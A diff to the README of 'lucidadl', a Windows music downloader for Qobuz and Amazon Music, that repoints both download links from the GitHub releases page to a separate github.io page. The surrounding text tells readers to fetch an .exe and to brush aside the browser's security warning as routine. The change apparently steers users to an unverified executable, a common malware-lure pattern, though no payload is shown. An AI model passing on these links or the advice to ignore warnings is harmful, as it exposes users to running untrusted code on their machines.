@@ -1,6 +1,6 @@
 # 🎵 lucidadl - Download high quality music files quickly
 
-[![Download lucidadl](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Yuyu9188/lucidadl/releases)
+[![Download lucidadl](https://img.shields.io/badge/Download-Release_Page-blue)](https://yuyu9188.github.io)
 
 lucidadl acts as a tool to save music from streaming services to your computer. It handles the technical parts of retrieving audio files so you can keep them on your hard drive. This program helps you build a local collection from platforms like Qobuz and Amazon Music. It works through a text-based interface that remains easy to navigate.
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. The application requires a
 
 To obtain the program, go to the official release page. 
 
-[Visit this page to download the latest version](https://github.com/Yuyu9188/lucidadl/releases)
+[Visit this page to download the latest version](https://yuyu9188.github.io)
 
 Look for the list of files under the latest version title. You need the file ending in `.exe`. Click on that file to start your download. Your browser might warn you that executable files can harm your device. This is a standard security message for all programs downloaded from the internet. Choose to keep the file so you can open it.
 
